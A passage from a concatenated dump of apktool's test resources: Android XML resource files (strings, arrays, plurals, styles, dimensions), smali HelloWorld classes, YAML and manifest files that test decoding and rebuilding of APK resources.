aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-fr/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test_formatting1"><a href="http://www.foo.com" style="text-decoration:none;">http://www.foo.com</a></string>
    <string name="test_formatting2"><a href="http://www.foo.com" style="text-decoration:none">http://www.foo.com</a></string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-ldrtl/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-lowdr-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001-mnc00/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001-mnc1/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/anims.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <item name="test_anims1" type="anim">@android:anim/bounce_interpolator</item>
    <item name="test_anims2" type="anim">@android:anim/cycle_interpolator</item>
    <item name="test_anims3" type="anim">@android:anim/decelerate_interpolator</item>
    <item name="test_anims4" type="anim">@android:anim/fade_in</item>
    <item name="test_anims5" type="anim">@android:anim/fade_out</item>
    <item name="test_anims6" type="anim">@android:anim/linear_interpolator</item>
    <item name="test_anims7" type="anim">@android:anim/overshoot_interpolator</item>
    <item name="test_anims8" type="anim">@android:anim/slide_in_left</item>
    <item name="test_anims9" type="anim">@android:anim/slide_out_right</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/arrays.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string-array name="test_array1">
        <item>TEST1</item>
        <item>TEST2</item>
        <item>TEST3</item>
        <item>%2$s foo %1$d</item>
        <item>http://google.com&amp;boo=1&amp;foo=2</item>
        <item>&lt;b>Bolded Text&lt;/b></item>
        <item>&lt;font size=16 align=middle>Small&lt;/font></item>
    </string-array>
    <integer-array name="test_array2">
        <item>-1</item>
        <item>0</item>
        <item>1</item>
    </integer-array>
    <array name="test_array3">
        <item></item>
        <item>true</item>
        <item>TEST</item>
        <item>5</item>
        <item>5.5</item>
        <item>10.0sp</item>
        <item>#ff123456</item>
    </array>
    <string-array name="issue_409">
        <item>@string/test1</item>
        <item>foo</item>
        <item>foo2</item>
    </string-array>
    <string-array name="issue_677" formatted="false">
        <item>category=temp%temp%foo</item>
    </string-array>
    <string-array name="issue_329">
        <item>res/</item>
        <item>view/</item>
    </string-array>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/bools.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <bool name="test_bool1">false</bool>
    <bool name="test_bool2">true</bool>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/colors.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="test_color1">#ff123456</color>
    <color name="test_color2">@android:color/white</color>
    <color name="test_color3">#00000000</color>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/dimens.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <dimen name="test_dimen1">10.0dip</dimen>
    <dimen name="test_dimen2">10.0sp</dimen>
    <dimen name="test_dimen3">10.0pt</dimen>
    <dimen name="test_dimen4">10.0px</dimen>
    <dimen name="test_dimen5">10.0mm</dimen>
    <dimen name="test_dimen6">10.0in</dimen>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/drawables.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <item name="test_drawable1" type="drawable">@android:drawable/btn_default</item>
    <item name="test_drawable2" type="drawable">#00000000</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/ids.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <item type="id" name="test_id1" />
    <item type="id" name="test_id2" />
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <integer name="test_integer1">-1</integer>
    <integer name="test_integer2">0</integer>
    <integer name="test_integer3">1</integer>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/layouts.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <item name="test_layouts1" type="layout">@android:layout/activity_list_item</item>
    <item name="test_layouts2" type="layout">@android:layout/browser_link_context_header</item>
    <item name="test_layouts3" type="layout">@android:layout/simple_list_item_1</item>
    <item name="test_layouts4" type="layout">@android:layout/simple_spinner_item</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/plurals.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <plurals name="test_plurals1">
        <item quantity="other">%1$s, %2$d foo(s)</item>
        <item quantity="one">%1$s, %2$d foo</item>
    </plurals>
    <plurals name="test_plurals2">
        <item quantity="other">%d foos</item>
        <item quantity="one">%d foo</item>
    </plurals>
    <plurals name="test_plurals3">
        <item quantity="other">foo %d moos</item>
        <item quantity="one">foo %d moo</item>
    </plurals>
    <plurals name="test_plurals4">
        <item quantity="other">foo %d</item>
        <item quantity="one">foo 1</item>
    </plurals>
    <plurals name="issue_658">
        <item quantity="other">&lt;b>%d&lt;/b> guide123</item>
        <item quantity="one">&lt;b>%d&lt;/b> 1</item>
    </plurals>
    <plurals name="issue_1431">
        <item quantity="other">Vous disposez de &lt;font color=#8c593c>%1$d contenus&lt;/font> sur &lt;font color=#8c593c>%2$d disponibles&lt;/font></item>
        <item quantity="one">Vous disposez de &lt;font color=#8c593c>%1$d contenu&lt;/font> sur &lt;font color=#8c593c>%2$d disponibles&lt;/font></item>
    </plurals>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test_string1"></string>
    <string name="test_string2">Lorem ipsum...</string>
    <string name="test_string3">\@</string>
    <string name="test_string4">\?</string>
    <string name="test_string5">\#ff123456</string>
    <string name="test_string7">&amp;</string>
    <string name="test_string8">"'"</string>
    <string name="test_string9">\"</string>
    <string name="test_string10">\u0005</string>
    <string name="test_string11">" foo  bar   "</string>
    <string name="test_string12">"foo
bar"</string>
    <string name="test_string13">" foo"<b>bar <i> baz </i></b> <u>foo</u></string>
    <string name="test_string14">foo<sometag someattr1="someval1" someattr2="someval2">bar</sometag>baz</string>
    <string name="test_string16">foo<b>bar<i>"b
        az"</i></b>foo</string>
    <string name="test_string17" formatted="false">%d of %d</string>
    <string name="test_string18" formatted="false">foo %d bar %</string>
    <string name="test_string19">%2$s foo %1$d</string>
    <string name="test_string20" formatted="false">%-e foo %,d</string>
    <string name="test_string21">%2$-e foo %1$,d</string>
    <string name="test_string22" formatted="false">%02d foo %01d</string>
    <string name="test_string23" formatted="false">%d foo %1</string>
    <string name="test_string24" formatted="false">%1% foo %2%</string>
    <string name="test_string25" formatted="false">foo %s bar %2$s baz</string>
    <string name="test_string26">賞金鬥士14</string>
    <string name="test_string27">{id:65538,v:2,tid:20003,mst:1,x:-1,y:-1,a:6000,b:3000,lm:{chp:1000,rep:0,bt:0,mp:[[101,0,1,0],[101,0,1,1],[101,0,1,2],[101,0,1,3],[101,0,1,4],[101,0,1,5],[100,0,0,0],[100,0,0,1],[100,0,0,2],[100,0,0,3],[100,0,0,4],[100,0,0,5]]},rm:{chp:1000,rep:0,bt:0,mp:[[100,0,1,0],[100,0,1,1],[100,0,1,2],[100,0,1,3],[100,0,1,4],[100,0,1,5],[101,0,0,0],[101,0,0,1],[101,0,0,2],[101,0,0,3],[101,0,0,4],[101,0,0,5]]}}</string>
    <string name="test_string28">{al:[[180,0,7,0,0,1000],[109,0,5,0,0],[109,0,5,2,0],[109,0,5,4,0],[100,0,3,0,0],[100,0,3,1,0],[100,0,3,2,0],[100,0,3,3,0],[100,0,3,4,0],[100,0,3,5,0],[103,0,1,0,0],[103,0,1,1,0],[103,0,1,2,0],[103,0,1,3,0],[103,0,1,4,0],[103,0,1,5,0],[106,0,2,0,0],[106,0,2,1,0],[106,0,2,2,0],[106,0,2,3,0],[106,0,2,4,0],[106,0,2,5,0],[800,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],[850],[950],[900,0],[1000,0,0]],v:4,s:-1575044211,rl:[[180,0,7,0,0,1000],[103,0,0,0,0],[103,0,0,1,0],[103,0,0,2,0],[103,0,0,3,0],[103,0,0,4,0],[103,0,0,5,0],[111,0,3,0,0],[111,0,3,1,0],[111,0,3,2,0],[111,0,3,3,0],[111,0,3,4,0],[111,0,3,5,0],[102,0,4,0,0],[102,0,4,1,0],[102,0,4,2,0],[102,0,4,3,0],[102,0,4,4,0],[102,0,4,5,0],[107,0,5,0,0],[107,0,5,1,0],[107,0,5,2,0],[107,0,5,3,0],[107,0,5,4,0],[107,0,5,5,0],[106,0,2,0,0],[106,0,2,1,0],[106,0,2,2,0],[106,0,2,3,0],[106,0,2,4,0],[106,0,2,5,0],[900],[1000,0,0]],m:[]}</string>
    <string name="test_string29" formatted="false">category=temp%temp%foo</string>
    <string name="test_string30">res/foo/</string>
    <string name="test_string31">res/foo</string>
    <string name="test_string32">[<font size="17">TEST STRING</font>]</string>
    <string name="test_string33"><font size="17">[TEST STRING]</font></string>
    <string name="test_string34">[<font size="17">TEST STRING]</font></string>
    <string name="test_string35"><font size="17">[TEST STRING</font>]</string>
    <string name="test_string36"><font size="17">TEST STRING</font></string>
    <string name="test_string37">[<font size="17">Ţåþ ţö ţýþé þåššŵöŕð one two three]</font></string>
    <string name="test_string38">[<font size="17">Ţåþ ţö ţýþé þåššŵöŕð one two three</font>]</string>
    <string name="test_string39"><font size="17">[Ţåþ ţö ţýþé þåššŵöŕð one two three</font>]</string>
    <string name="test_string40">[<font size="17">]Ţåþ ţö ţýþé þåššŵöŕð one two three</font></string>
    <string name="test_string41"><font size="17">[Ţåþ ţö ţýþé þåššŵöŕð one two three]</font></string>
    <string name="test_string42">🔆</string>
    <string name="test_string43"><ul> <li><b>aaaaa aa aaaaa</b> – aaaaaaa aaaaaaaaaa aa aaaaaaaa aaaaaa aaaaa (aaaa) aaaa aaaaaaaaa aaaaa aa aaaaaaaaa aaaaaaa aaaa</li> <li><b>aaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaa</b> – aaaaaaa aaaaaaaaaa aaaaaaaaa aaaa aaaaaa aa aaaa aaaa aaaa aaaa aaaaaaa aaaaaaaaaaaaa, aaaaaa aaa aaaaaaaaaa (aaa) aaaaaaaaaaaaaaa</li> <li><b>aaaaaaaaaaa aaaaaa aaaaaaaaaa</b> – aaaaaaaaaa aaaa aaaaaa aa a aaa aa aaaaaa aaa aaaaaaa (aaaaa aaaaaaaa) aaaaaaaa aa aaaaaa aaaaa aaa aaaa</li> </ul></string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc001/styles.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="TextAppearance" parent="@android:style/TextAppearance" />
    <style name="TextAppearance.EditEvent_Label" parent="@style/TextAppearance">
        <item name="android:gravity">center_vertical</item>
        <item name="android:popupAnimationStyle">@empty</item>
    </style>
    <style name="TextAppearance.EditEvent_Button" parent="@style/TextAppearance.EditEvent_Label">
        <item name="android:textColor">#ff777777</item>
        <item name="@string/issue_477">?android:dividerVertical</item>
    </style>
    <style name="Foo.Bar" parent=""/>
    <style name="IssueStyle">
        <item name="@string/issue_1123">@null</item>
    </style>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc002/arrays.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string-array name="test_array4">
        <item>@string/test_string1</item>
        <item>@string/test_string2</item>
    </string-array>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc002/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test_reference1">@string/test1</string>
    <string name="test_reference2">@android:string/ok</string>
    <string name="test_reference3">?android:textStyle</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc003/arrays.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string-array name="test_array4">
        <item>3.0in</item>
    </string-array>
    <string-array name="test_array5">
        <item>65.0%</item>
        <item>65%</item>
    </string-array>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc003/bools.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <item type="bool" name="test_crossType_str2bool">TEST</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc003/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <item type="integer" name="test_crossType_str2int">TEST</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc003/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <item type="string" name="test_crossType_bool2str">true</item>
    <item type="string" name="test_crossType_int2str">5</item>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc004-mnc4-en-rUS-ldrtl-sw100dp-w200dp-h300dp-long-round-highdr-land-desk-night-xhdpi-finger-keyssoft-12key-navhidden-dpad-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1" />
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc238-mnc6/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mcc238-mnc870/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-mnc1/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-notround/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-nowidecg-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-round/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-vrheadset-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-watch/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values-widecg-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values/attrs.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <attr format="integer" name="test_attr1"/>
    <attr format="reference" name="test_attr2"/>
    <attr format="reference" name="test_attr3"/>
    <attr format="string" name="test_attr4"/>
    <attr name="test_attr5">
        <enum name="out_test" value="0"/>
        <enum name="in_test" value="1"/>
    </attr>
    <attr format="reference" name="test_attr6"/>
    <attr format="reference" name="test_attr7"/>
    <attr format="reference|color" name="test_attr8"/>
    <attr format="color" name="test_attr9"/>
    <attr format="boolean" name="test_attr10"/>
    <attr name="test_attr11">
        <enum name="TEST_ZERO" value="0" />
        <enum name="TEST_ONE" value="1" />
    </attr>
    <attr name="min_value" format="float" />
    <attr name="max_value" format="float" />
    <attr name="default_value" format="float" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values/ids.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<resources>
    <item type="id" name="test_attr1" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <integer name="test_integer1">-1</integer>
    <integer name="test_integer2">0</integer>
    <integer name="test_integer3">1</integer>
    <integer name="reference_test">0</integer>
    <integer name="issue_1223_1">700</integer>
    <integer name="issue_1223_2">@integer/issue_1223_1</integer>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values/public.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="hello_world" id="0x7f020000" />
    <public type="xml" name="ww_box_styles_schema" id="0x7f1500df" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1" />
    <string name="hello_world">Hello World</string>
    <string name="issue_477">divider</string>
    <string name="issue_1123">divider</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/xml/literals.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<View xmlns:android="http://schemas.android.com/apk/res/android"
    test1=""
    test2="Lorem ipsum"
    test3="\@"
    test4="\?"
    test5="#ff123456"
    test6="\#ff123456"
    test7="&amp;"
    test8="'"
    test9="&quot;"
    test10="\u0005"
    test11=" foo  bar   "
    test12="foo \n bar"
    test15="5"
/>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/xml/references.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<View xmlns:android="http://schemas.android.com/apk/res/android"
    test1="@string/test1"
    test2="@android:string/ok"
    test3="?android:textStyle"
/>

```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/res/xml/ww_box_styles_schema.xsd`:

```xsd
<?xml version="1.0" encoding="utf-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
    <xs:element name="test">
        <xs:complexType>
            <xs:sequence>
                <xs:element name="person" type="xs:string"/>
                <xs:element name="address">
                    <xs:complexType>
                        <xs:sequence>
                            <xs:element name="name" type="xs:string"/>
                            <xs:element name="address" type="xs:string"/>
                            <xs:element name="city" type="xs:string"/>
                            <xs:element name="country" type="xs:string"/>
                        </xs:sequence>
                    </xs:complexType>
                </xs:element>
            </xs:sequence>
        </xs:complexType>
    </xs:element>
</xs:schema>
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/smali/HelloWorld.smali`:

```smali
.class public LHelloWorld;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/smali_classes2/HelloDualDexSupport.smali`:

```smali
.class public LHelloDualDexSupport;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/smali_classes3/HelloTripleDexSupport.smali`:

```smali
.class public LHelloTripleDexSupport;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/unknown/hidden.file`:

```file
This file is unknown.
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/unknown/lib_bug603/bug603`:

```
https://code.google.com/p/android-apktool/issues/detail?id=603
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/unknown/nonprintable.file`:

```file
This file's name contains a non-printable character.
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/unknown/stored.file`:

```file
This file is not compressed.
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testapp/unknown/unk_folder/unknown_file`:

```
I am a hidden file. Put here by a developer to make recompilation difficult.
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testjar/apktool.yml`:

```yml
version: 2.0.0
apkFileName: testjar.jar
```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testjar/original/META-INF/MANIFEST.MF`:

```MF
Manifest-Version: 1.0
Created-By: 1.6.0_45 (Sun Microsystems Inc.)


```

`brut.apktool/apktool-lib/src/test/resources/aapt1/testjar/smali/com/apktool/test/Test.smali`:

```smali
.class public LTest;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-false/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.ibotpeaches.issue2328" xmlns:android="http://schemas.android.com/apk/res/android" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038">
<application android:debuggable="false"/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-false/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2328.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-false/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-missing/AndroidManifest.xml`:

```xml
